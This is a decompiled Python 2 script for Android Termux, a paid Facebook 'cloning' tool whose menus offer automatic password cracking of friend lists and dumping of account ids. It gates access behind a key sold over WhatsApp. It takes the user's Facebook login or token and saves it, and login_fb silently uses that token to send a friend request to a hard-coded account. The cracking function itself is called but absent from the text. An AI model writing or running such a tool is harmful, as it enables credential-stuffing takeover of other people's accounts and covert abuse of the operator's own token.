# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:59:33) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: <www.youtube.com/c/pythonlife
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string
from multiprocessing.pool import ThreadPool
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

try:
    os.mkdir('/sdcard/ids/ex_ids')
except OSError:
    pass

os.system('git pull')
from requests.exceptions import ConnectionError
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
os.system('clear')

def logo():
    os.system('echo -e "\n\n\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\n\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\n\n\xe2\x96\x92\xe2\x96\x88\xe2\x96\x91\xe2\x96\x84\xe2\x96\x80 \xe2\x96\x80\xe2\x96\x88\xe2\x96\x80 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88 \n\xe2\x96\x92\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x96\x91 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x91 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x80 \n\xe2\x96\x92\xe2\x96\x88\xe2\x96\x91\xe2\x96\x92\xe2\x96\x88 \xe2\x96\x84\xe2\x96\x88\xe2\x96\x84 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x91\xe2\x96\x92\xe2\x96\x88\n\n\n-----------------------------------------------\n\n\xe2\x9e\xa3UPDATE CMD   : NOT FOR FREE  \n\xe2\x9e\xa3CYBER NAME   : MAFIA-KILLER \n\xe2\x9e\xa3WHATSAPP NO  : +92132197796\n\xe2\x9e\xa3COMMAMD TYPE : LOGIN WITH TOKEN\n\xe2\x9e\xa3NEW UPDATE   : TOKEN EXPIRING PROBLEM CLEAR \n\xe2\x9e\xa3NOTE         : USE 4GB YA 6GB RAM MOBILE \n\xe2\x9e\xa3WARNING      : DON,T CALL ME ONLY TEXT \n\xe2\x9e\xa3NOTE         : 1ST CLEAR TERMUX MEMORY DATA \n\xe2\x9e\xa3TOOL NAME    : PAID1000 FILE CLONING\n\n-----------------------------------------------" | lolcat')


def logo1():
    os.system('echo -e "\n\n(1) Login With id/pass \n\n(2) Login With Token" | lolcat')


def logo2():
    os.system('echo -e "\n\n(1) Auto Pass Cracking (7 pass)\n\n(2) Choice Pass Cracking (7pass)\n\n(3) Target Cloning (Coming soon) \n\n(4) Dump 100069, 100070, 100071,100072 Id only " | lolcat')


def logo3():
    os.system('echo -e "\n\n(1) Public Friendlist Crack  \n\n(2) File Cracking (100%)\n\n(0) Close Program" | lolcat')


def logo4():
    os.system('echo -e "\n\n(1) Public Friendlist Crack  \n\n(2) File Cracking (100%)\n\n(0) Close Program" | lolcat')


idh = []
back = 0

def reg():
    os.system('clear')
    logo()
    print ''
    os.system('echo -e "\n\n\xe2\x8b\x9f The Approval For Login" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f Buy This Tool And Enjoy " | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f Checking approval...." | lolcat')
    time.sleep(1)
    try:
        to = open('/sdcard/.kawjjtgbswqlbbfvmoodfvzshbbbffhhjuujjjjhjjjjqbbwjjjrrrttunddbsdbdfsaakkkvffteu3beb.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/Mafia-Killer404/paid1000/main/.server.txt').text
    if to in r:
        os.system('cd jjjjj && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd jjjjj && node index.js &')
        time.sleep(5)
        g()
    else:
        os.system('clear')
        logo()
        print ''
        os.system('echo -e "\n\n\xe2\x8b\x9f  Approved Failed" | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f  Your key is Not Approved" | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f  Copy The id and send to Tool owner" | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f The Approval For Login" | lolcat')
        print '\x1b[0;31m\xe2\x8b\x9f \x1b[1;92mYour id: \x1b[0;36m' + to
        raw_input('\x1b[0;31m\xe2\x8b\x9f\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923132197796')
        reg()


def reg2():
    os.system('clear')
    logo()
    os.system('echo -e "\n\n\xe2\x8b\x9f Approval not detected" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f Copy Your Key and Press Enter" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f Select Whatsaap To Countinue" | lolcat')
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923132197796')
    sav = open('/sdcard/.kawjjtgbswqlbbfvmoodfvzshbbbffhhjuujjjjhjjjjqbbwjjjrrrttunddbsdbdfsaakkkvffteu3beb.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()


def g():
    os.system('clear')
    logo()
    print '\x1b[1;91mTool Verification'
    print
    ip = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Your-ip :  ')
    if ip == 'a':
        os.system('clear')
        logo()
        print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Your-ip : (Confirmed)'
        ss = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Tool-ip : ')
        if ss == 'a':
            os.system('clear')
            logo()
            print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Your-ip : (Confirmed)'
            print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Tool-ip : (Confirmed)'
            time.sleep(1)
            print ''
            print '\x1b[1;92m \xe2\x9c\x93 \x1b[1;95m All Set'
            time.sleep(1)
            login_choice()
        else:
            print '[!] Tool-ip : ' + ss + ' (Wrong)'
            time.sleep(1)
            g()
    else:
        print '[!] Tool-ip : ' + ip + ' (Wrong)'
        time.sleep(1)
        g()


def login_choice():
    os.system('clear')
    try:
        open('.login.txt', 'r')
        menu()
    except IOError:
        os.system('clear')
        logo()
        print
        os.system('echo -e "<>LOGIN MENU<>" | lolcat')
        logo1()
        print ''
        login_select()


def login_select():
    select = raw_input('\x1b[1;92m\xe2\x80\xa2\xe2\x89\xab \x1b[0;97m')
    if select == '2':
        login_token()
    elif select == '1':
        login_fb()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        print ''
        time.sleep(1)
        login_select()


def login_fb():
    os.system('clear')
    logo()
    print
    print '   \x1b[101m\x1b[37;1mLOGIN Fb-ID\x1b[0m'
    print
    id = raw_input(' Id/mail/number: ')
    id1 = id.replace(' ', '')
    id2 = id1.replace('(', '')
    uid = id2.replace(')', '')
    pwd = raw_input(' Password: ')
    print ''
    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd, headers=header).text
    q = json.loads(data)
    if 'loc' in q:
        hamza = open('.login.txt', 'w')
        hamza.write(q['loc'])
        hamza.close()
        requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token=' + q['loc'])
        menu()
    elif 'www.facebook.com' in q['error']:
        print ''
        print '\t    \x1b[1;31mUser must verify account before login\x1b[0;97m'
        time.sleep(1)
        print ''
        raw_input('\tPress enter to back ')
        login_choice()
    else:
        print ''
        print '\t    \x1b[1;31mIncorrect credentials\x1b[0;97m'
        raw_input('Press enter to try again ')
        login_choice()


def login_token():
    os.system('clear')
    try:
        open('.login.txt', 'r')
        time.sleep(1)
        menu()
    except (KeyError, IOError):
        os.system('clear')
        logo()
        print
        print '   \x1b[101m\x1b[37;1mLOGIN FB-TOKEN\x1b[0m'
        print
        token = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Paste token : ')
        token_save = open('.login.txt', 'w')
        token_save.write(token)
        token_save.close()
        time.sleep(1)
        menu()


def menu():
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print ''
        logo()
        print ''
        print '\t    \x1b[1;31mToken not found\x1b[0;97m'
        time.sleep(1)
        login_choice()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers=header)
        a = json.loads(r.text)
        name = a['name']
    except KeyError:
        os.system('clear')
        print ''
        logo()
        print ''
        print '\t    \x1b[1;31mToken expired\x1b[0;97m'
        time.sleep(1)
        os.system('rm -rf .login.txt')
        login_choice()

    os.system('clear')
    logo()
    print 47 * '\x1b[1;91m\xe2\x95\x90'
    print '\t\x1b[1;33mWellCome to token id user: ' + name + '\x1b[0;97m'
    print 47 * '\x1b[1;91m\xe2\x95\x90'
    logo2()
    print ''
    menu_option()


def menu_option():
    select = raw_input('\x1b[1;92m\xe2\x80\xa2\xe2\x89\xab\x1b[0;97m ')
    if select == '1':
        crack()

if __name__ == '__main__':
    reg()
